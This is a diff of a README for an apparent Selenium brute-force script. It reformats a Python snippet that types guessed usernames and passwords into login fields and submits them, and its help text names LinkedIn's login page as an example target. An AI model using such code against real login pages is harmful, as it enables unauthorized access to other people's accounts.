@@ -6,15 +6,15 @@ A simple script for doing brute-force attack using selenium.
 ![](https://github.com/mohammadkamrani/Selenium-Brute-Force/blob/main/2021-01-20_14-43-37.jpg)
 put them in code.
 ```python
-	username = driver.find_element_by_id("username")		
-	username.clear()
-	print("username: "+curuser)
-	username.send_keys(curuser)		
-	password = driver.find_element_by_id("password")
-	password.clear()
-	print("password: "+passw+"\n")
-	password.send_keys(passw)			
-	driver.find_element_by_class_name('login__form_action_container').click()
+username = driver.find_element_by_id("username")		
+username.clear()
+print("username: "+curuser)
+username.send_keys(curuser)		
+password = driver.find_element_by_id("password")
+password.clear()
+print("password: "+passw+"\n")
+password.send_keys(passw)			
+driver.find_element_by_class_name('login__form_action_container').click()
 ```
 - -h, --help  show this help message and exit
 - -t    target's url: https://www.linkedin.com/uas/login
